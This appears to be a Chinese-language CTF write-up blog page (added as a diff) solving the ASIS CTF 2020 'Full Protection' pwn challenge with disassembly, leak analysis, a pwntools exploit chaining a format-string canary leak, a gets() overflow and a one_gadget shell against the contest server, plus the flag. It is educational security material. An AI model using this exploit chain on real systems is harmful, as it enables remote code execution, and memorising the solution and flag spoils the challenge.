@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.74.3" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark"><title>ASIS CTF 2020 pwn Full Protection Writeup&nbsp;&ndash;&nbsp;Shin&#39;s Blog</title><link rel="stylesheet" href="/css/core.min.56852e5dcac5d77dc592e9044e37cf8a2f4c0ecdb70121069de9cdf63290499e3eec4da4a5269dcc777d4703484701cd.css" integrity="sha384-VoUuXcrF133FkukETjfPii9MDs23ASEGnenN9jKQSZ4&#43;7E2kpSadzHd9RwNIRwHN"><body>
+    <div class="base-body"><section id="header" class="site header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/"><span class="site name">Shin's Blog</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/categories/">Categories</a><a class="nav item" href="/tags/">Tags</a><a class="nav item" href="/content/about.html">About</a><a class="nav item" href="https://gohugo.io/"target="_blank">Hugo</a></nav></div></span></div><div class="site slogan"><span class="title">Listening Music and Learning CS</span></div></section><div id="content"><section class="article header">
+    <h1 class="article title">ASIS CTF 2020 pwn Full Protection Writeup</h1><p class="article date">Wednesday, July 8, 2020</p></section><article class="article markdown-body"><h1 id="asis-ctf-2020-pwn-full-protection-writeup">ASIS CTF 2020 pwn Full Protection Writeup</h1>
+<p>此題為 ASIS 的暖身題，但並非想像中的極易簡單 <br>
+不過很裸，測試之後會發現有 format string 的漏洞。 <br></p>
+<h2 id="檢查保護機制">檢查保護機制</h2>
+<p>首先檢查此程式有開啟那些保護，發現全開，先別緊張，先觀察看看此程式有那裡能夠破解其中的保護</p>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    FORTIFY:  Enabled
+</code></pre><h2 id="使用-objdump-觀察-source-code">使用 objdump 觀察 source code</h2>
+<p>使用 objdump 工具 反組譯 <code>main()</code> 如下：</p>
+<pre><code>0000000000000850 &lt;main&gt;:
+ 850:   66 0f ef c0             pxor   xmm0,xmm0
+ 854:   53                      push   rbx
+ 855:   48 83 ec 50             sub    rsp,0x50
+ 859:   64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
+ 860:   00 00 
+ 862:   48 89 44 24 48          mov    QWORD PTR [rsp+0x48],rax
+ 867:   31 c0                   xor    eax,eax
+ 869:   0f 29 04 24             movaps XMMWORD PTR [rsp],xmm0
+ 86d:   48 89 e3                mov    rbx,rsp
+ 870:   0f 29 44 24 10          movaps XMMWORD PTR [rsp+0x10],xmm0
+ 875:   0f 29 44 24 20          movaps XMMWORD PTR [rsp+0x20],xmm0
+ 87a:   0f 29 44 24 30          movaps XMMWORD PTR [rsp+0x30],xmm0
+ 87f:   eb 27                   jmp    8a8 &lt;main+0x58&gt;
+ 881:   0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
+ 888:   48 89 de                mov    rsi,rbx
+ 88b:   bf 01 00 00 00          mov    edi,0x1
+ 890:   31 c0                   xor    eax,eax
+ 892:   e8 89 ff ff ff          call   820 &lt;__printf_chk@plt&gt;
+ 897:   48 8b 35 72 07 20 00    mov    rsi,QWORD PTR [rip+0x200772]        # 201010 &lt;stdout@@GLIBC_2.2.5&gt;
+ 89e:   bf 0a 00 00 00          mov    edi,0xa
+ 8a3:   e8 48 ff ff ff          call   7f0 &lt;_IO_putc@plt&gt;
+ 8a8:   be 40 00 00 00          mov    esi,0x40
+ 8ad:   48 89 df                mov    rdi,rbx
+ 8b0:   e8 7b 01 00 00          call   a30 &lt;readline&gt;
+ 8b5:   85 c0                   test   eax,eax
+ 8b7:   75 cf                   jne    888 &lt;main+0x38&gt;
+ 8b9:   31 c0                   xor    eax,eax
+ 8bb:   48 8b 54 24 48          mov    rdx,QWORD PTR [rsp+0x48]
+ 8c0:   64 48 33 14 25 28 00    xor    rdx,QWORD PTR fs:0x28
+ 8c7:   00 00 
+ 8c9:   75 06                   jne    8d1 &lt;main+0x81&gt;
+ 8cb:   48 83 c4 50             add    rsp,0x50
+ 8cf:   5b                      pop    rbx
+ 8d0:   c3                      ret    
+ 8d1:   e8 0a ff ff ff          call   7e0 &lt;__stack_chk_fail@plt&gt;
+ 8d6:   66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
+ 8dd:   00 00 00
+</code></pre><p>觀察後發現，此 <code>__printf_chk()</code> 查詢 Linux Standard Base Core Specification[2] 後發現會引發 format string 漏洞<br></p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">int</span> <span class="nf">__printf_chk</span><span class="p">(</span><span class="kt">int</span> <span class="n">flag</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">format</span><span class="p">);</span>
+</code></pre></div><p>原因在 <code>__printf_chk()</code> 第二個參數 <code>rsi</code> 為可輸入(or可控)的變數 <br></p>
+<pre><code> 888:   48 89 de                mov    rsi,rbx
+ 88b:   bf 01 00 00 00          mov    edi,0x1
+ 890:   31 c0                   xor    eax,eax
+ 892:   e8 89 ff ff ff          call   820 &lt;__printf_chk@plt&gt;
+</code></pre><p>往上 trace 會得知 <code>rbx</code> 值為 <code>rsp</code>，也就是透過此漏洞可以 leak 出 <strong>stack section 的內容</strong></p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ ./chall
+%p %p %p %p %p %p %p %p %p %p
+0x7ffcc97bb7b0 0x10 0x7fb1c8a8e8c0 0x7fb1c8c9c500 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025 <span class="o">(</span>nil<span class="o">)</span> <span class="o">(</span>nil<span class="o">)</span>
+</code></pre></div><p>並且發現 <code>main()</code> 所呼叫的 <code>readline()</code> 並非 import，<br>
+使用 objdump trace 一下，發現此程式使用了 <code>gets()</code> <br></p>
+<pre><code>0000000000000a30 &lt;readline&gt;:
+ a30:   55                      push   rbp
+ a31:   53                      push   rbx
+ a32:   31 c0                   xor    eax,eax
+ a34:   48 89 fb                mov    rbx,rdi
+ a37:   89 f5                   mov    ebp,esi
+ a39:   48 83 ec 08             sub    rsp,0x8
+ a3d:   e8 ce fd ff ff          call   810 &lt;gets@plt&gt;
+ a42:   48 89 df                mov    rdi,rbx
+ a45:   e8 86 fd ff ff          call   7d0 &lt;strlen@plt&gt;
+ a4a:   39 e8                   cmp    eax,ebp
+ a4c:   7d 07                   jge    a55 &lt;readline+0x25&gt;
+ a4e:   48 83 c4 08             add    rsp,0x8
+ a52:   5b                      pop    rbx
+ a53:   5d                      pop    rbp
+ a54:   c3                      ret    
+ a55:   48 8d 3d 98 00 00 00    lea    rdi,[rip+0x98]        # af4 &lt;_IO_stdin_used+0x4&gt;
+ a5c:   e8 5f fd ff ff          call   7c0 &lt;puts@plt&gt;
+ a61:   bf 01 00 00 00          mov    edi,0x1
+ a66:   e8 45 fd ff ff          call   7b0 &lt;_exit@plt&gt;
+ a6b:   0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]
+</code></pre><h2 id="構造-payload">構造 Payload</h2>
+<p>根據 CWE (Common Weakness Enumeration) 弱點分類系統，<br>
+編號為 CWE-242[1]： <strong>Use of Ingherently Dangerous Function</strong><br>也就是說，一旦使用了 <code>gets()</code>，便會發生 overflow，雖然有開啟 Canary 保護，<br>
+然而，此程式有 format string 漏洞，便能 leak 出 Canary。 <br>
+<br>
+由於 <code>rbx</code> 值為 <code>rsp</code>，而 <code>rsp</code> 值相當於 <code>rbp-0x50</code>，<br>
+因此構造 payload 如下：</p>
+<pre><code>aaaaaaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+</code></pre><p>其 Leak 出 Stack 內容如下：</p>
+<pre><code>aaaaaaaa 0x7ffe915e8330 0x10 0x7f55f21e38c0 0x7f55f23f1500 0x6161616161616161 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x702520 0x7ffe915e8460 0x513bddc1e9390500 (nil) 0x7f55f1e17b97 0x1 0x7ffd7626bab8 0x100008000 0x561ce2198850
+</code></pre><p>整理成 stack section 內容如下 (按照下面 gdb 來對齊)： <br>
+(位址因為有開ASLR，每一次執行位址都會不同)</p>
+<pre><code>Address             Contents
+--------------------------------------------------
+0x7ffe915e8310 &lt;%p&gt; 0x7ffe915e8330    
+0x7ffe915e8318 &lt;%p&gt; 0x10
+0x7ffe915e8320 &lt;%p&gt; 0x7fbfee8158c0
+0x7ffe915e8328 &lt;%p&gt; 0x7fbfeea23500
+0x7ffe915e8330 &lt;%p&gt; 0x6161616161616161 &lt;rbp-0x50&gt;
+0x7ffe915e8338 &lt;%p&gt; 0x2520702520702520 一堆 &quot;%p &quot;
+0x7ffe915e8340 &lt;%p&gt; 0x2070252070252070 一堆 &quot;%p &quot;
+0x7ffe915e8348 &lt;%p&gt; 0x7025207025207025 一堆 &quot;%p &quot;
+0x7ffe915e8350 &lt;%p&gt; 0x2520702520702520 一堆 &quot;%p &quot;
+0x7ffe915e8358 &lt;%p&gt; 0x2070252070252070 一堆 &quot;%p &quot;
+0x7ffe915e8360 &lt;%p&gt; 0x7025207025207025 一堆 &quot;%p &quot;
+0x7ffe915e8368 &lt;%p&gt; 0x702520           &quot;%p &quot;
+0x7ffe915e8370 &lt;%p&gt; 0x7ffe915e8460     &lt;_start&gt;
+0x7ffe915e8378 &lt;%p&gt; 0x513bddc1e9390500 &lt;canary&gt;
+0x7ffe915e8380 &lt;%p&gt; (nil)
+0x7ffe915e8388 &lt;%p&gt; 0x7f55f1e17b97 &lt;__libc_start_main+231&gt; 為 saved rbp
+0x7ffe915e8390 &lt;%p&gt; 0x1            &lt;ret&gt;
+0x7ffe915e8398 &lt;%p&gt; 0x7ffd7626bab8
+0x7ffe915e83a0 &lt;%p&gt; 0x100008000
+0x7ffe915e83a8 &lt;%p&gt; 0x561ce2198850
+--------------------------------------------------
+</code></pre><p>觀察輸入 format string payload 時，可利用的殘留值 <br>
+殘留值指的是，當呼叫 import function 時，我們可透過 format string leak 的位址，計算出 library base address，並且在 return 時候，竄改成 do_system() 位址，便能夠取得 shell <br>
+因此我們利用 <code>__libc_start_main()</code> 來計算 base <br>
+此外，若輸入包含 <code>\x00</code> 開頭的字串，便能夠繞過長度的檢查</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">gdb-peda$ stack <span class="m">25</span>
+0000<span class="p">|</span> 0x7ffff48dcd50 --&gt; 0x7ffff48dcd70 --&gt; 0x6161616161616100 <span class="o">(</span><span class="s1">&#39;&#39;</span><span class="o">)</span>
+0008<span class="p">|</span> 0x7ffff48dcd58 --&gt; 0x7ffff48dcd70 --&gt; 0x6161616161616100 <span class="o">(</span><span class="s1">&#39;&#39;</span><span class="o">)</span>
+0016<span class="p">|</span> 0x7ffff48dcd60 --&gt; 0x55ee80b9ca70 <span class="o">(</span>&lt;__libc_csu_init&gt;:	push   r15<span class="o">)</span>
+0024<span class="p">|</span> 0x7ffff48dcd68 --&gt; 0x55ee80b9c8b5 <span class="o">(</span>&lt;main+101&gt;:	<span class="nb">test</span>   eax,eax<span class="o">)</span>
+0032<span class="p">|</span> 0x7ffff48dcd70 --&gt; 0x6161616161616100 <span class="o">(</span><span class="s1">&#39;&#39;</span><span class="o">)</span>
+0040<span class="p">|</span> 0x7ffff48dcd78 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">56</span> times&gt;<span class="o">)</span>
+0048<span class="p">|</span> 0x7ffff48dcd80 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">48</span> times&gt;<span class="o">)</span>
+0056<span class="p">|</span> 0x7ffff48dcd88 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">40</span> times&gt;<span class="o">)</span>
+0064<span class="p">|</span> 0x7ffff48dcd90 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">32</span> times&gt;<span class="o">)</span>
+0072<span class="p">|</span> 0x7ffff48dcd98 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">24</span> times&gt;<span class="o">)</span>
+0080<span class="p">|</span> 0x7ffff48dcda0 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">16</span> times&gt;<span class="o">)</span>
+0088<span class="p">|</span> 0x7ffff48dcda8 <span class="o">(</span><span class="s2">&#34;aaaaaaaa&#34;</span><span class="o">)</span>
+0096<span class="p">|</span> 0x7ffff48dcdb0 --&gt; 0x7ffff48dce00 --&gt; 0x55ee80b9c920 <span class="o">(</span>&lt;_start&gt;:	xor    ebp,ebp<span class="o">)</span>
+0104<span class="p">|</span> 0x7ffff48dcdb8 --&gt; 0x659a9a071d0a4d00 
+0112<span class="p">|</span> 0x7ffff48dcdc0 --&gt; 0x0 
+0120<span class="p">|</span> 0x7ffff48dcdc8 --&gt; 0x7f022ac24b97 <span class="o">(</span>&lt;__libc_start_main+231&gt;:	mov    edi,eax<span class="o">)</span>
+0128<span class="p">|</span> 0x7ffff48dcdd0 --&gt; 0x1 
+0136<span class="p">|</span> 0x7ffff48dcdd8 --&gt; 0x7ffff48dcea8 --&gt; 0x7ffff48df16e --&gt; 0x6c6c6168632f2e <span class="o">(</span><span class="s1">&#39;./chall&#39;</span><span class="o">)</span>
+0144<span class="p">|</span> 0x7ffff48dcde0 --&gt; 0x100008000 
+0152<span class="p">|</span> 0x7ffff48dcde8 --&gt; 0x55ee80b9c850 <span class="o">(</span>&lt;main&gt;:	pxor   xmm0,xmm0<span class="o">)</span>
+0160<span class="p">|</span> 0x7ffff48dcdf0 --&gt; 0x0 
+0168<span class="p">|</span> 0x7ffff48dcdf8 --&gt; 0xf55b7785d276456b 
+0176<span class="p">|</span> 0x7ffff48dce00 --&gt; 0x55ee80b9c920 <span class="o">(</span>&lt;_start&gt;:	xor    ebp,ebp<span class="o">)</span>
+0184<span class="p">|</span> 0x7ffff48dce08 --&gt; 0x7ffff48dcea0 --&gt; 0x1 
+0192<span class="p">|</span> 0x7ffff48dce10 --&gt; 0x0 
+</code></pre></div><h2 id="solution">Solution</h2>
+<pre><code class="language-python=" data-lang="python=">from pwn import *
+
+one_gadget = 0x4f322
+libc_start_main_libc = 0x21ab0
+
+p = remote(&quot;69.172.229.147&quot;, 9002)
+
+payload = 'a'*8 + ' %p'*18
+p.sendline(payload)
+leak = p.recvline().split()
+canary = int(leak[14], 16)
+libc_start_main_address = int(leak[16], 16)
+print(&quot;canary: &quot;, hex(canary))
+print(&quot;libc: &quot;, hex(libc_start_main_address))
+
+# calculat libc base address
+base = libc_start_main_address - 231 - libc_start_main_libc
+shell = base + one_gadget
+
+payload = '\x00' + 'a'*63 + p64(canary) + p64(canary) + 'a'*8 + p64(shell)
+p.sendline(payload)
+p.interactive()
+p.close()
+
+# ASIS{s3cur1ty_pr0t3ct10n_1s_n07_s1lv3r_bull3t}
+</code></pre><h2 id="format-string-補充">format string 補充</h2>
+<p>通常使用到下列 function，必須注意避免 format string 漏洞： <br></p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp"></span><span class="n">printf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...);</span>
+<span class="n">fprintf</span><span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...);</span>
+<span class="n">dprintf</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...);</span>
+<span class="n">sprintf</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...);</span>
+<span class="n">snprintf</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...);</span>
+<span class="kt">int</span> <span class="nf">__printf_chk</span><span class="p">(</span><span class="kt">int</span> <span class="n">flag</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">format</span><span class="p">);</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;stdarg.h&gt;</span><span class="cp">
+</span><span class="cp"></span><span class="n">vprintf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="n">va_list</span> <span class="n">ap</span><span class="p">);</span>
+<span class="n">vfprintf</span><span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="n">va_list</span> <span class="n">ap</span><span class="p">);</span>
+<span class="n">vdprintf</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="n">va_list</span> <span class="n">ap</span><span class="p">);</span>
+<span class="n">vsprintf</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="n">va_list</span> <span class="n">ap</span><span class="p">);</span>
+<span class="n">vsnprintf</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="n">va_list</span> <span class="n">ap</span><span class="p">);</span>
+</code></pre></div><h2 id="備註">備註</h2>
+<p>[1] <a href="https://cwe.mitre.org/data/definitions/242.html"target="_blank">CWE-242: Use of Ingherently Dangerous Function</a> <br>
+[2] <a href="https://refspecs.linuxbase.org/LSB_4.1.0/LSB-Core-generic/LSB-Core-generic/libc---printf-chk-1.html"target="_blank">Linux Standard Base Core Specification  __printf_chk()</a></p>
+</article><section class="article labels"><a class="category" href=/categories/writeup/>writeup</a><a class="tag" href=/tags/ctf/>CTF</a><a class="tag" href=/tags/pwn/>pwn</a></section><section class="article navigation"><p><a class="link" href="/posts/2020/07/free_space_on_ubuntu/"><span class="li">&larr;</span>Free Space or Extend Space On Ubuntu</a></p><p><a class="link" href="/posts/2020/06/ais3ctf2020_portal_gun_writeup/"><span class="li">&rarr;</span>AIS3 2020 Pre-Exam CTF pwn Portal Gun writeup</a class="link">
+    </p></section></div><section id="footer" class="footer"><div class="footer-wrap">
+    <p class="copyright">©2020 Notepadium.</p>
+    <p class="powerby"><span>Powered by </span><a href="https://gohugo.io" 
+        target="_blank">Hugo</a><span> and the </span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank">Notepadium</a></p>
+</div></section><script src="/js/hljs.min.0799348a91dce12c6be4a73f943cfe78f181f4e6f6ec35c4af0fca1de377879f77cfab03c30f03a174d675737b5a9314.js" integrity="sha384-B5k0ipHc4Sxr5Kc/lDz&#43;ePGB9Ob27DXErw/KHeN3h593z6sDww8DoXTWdXN7WpMU"></script><script>hljs.initHighlightingOnLoad();</script></div>
+</body>
+
+</html>
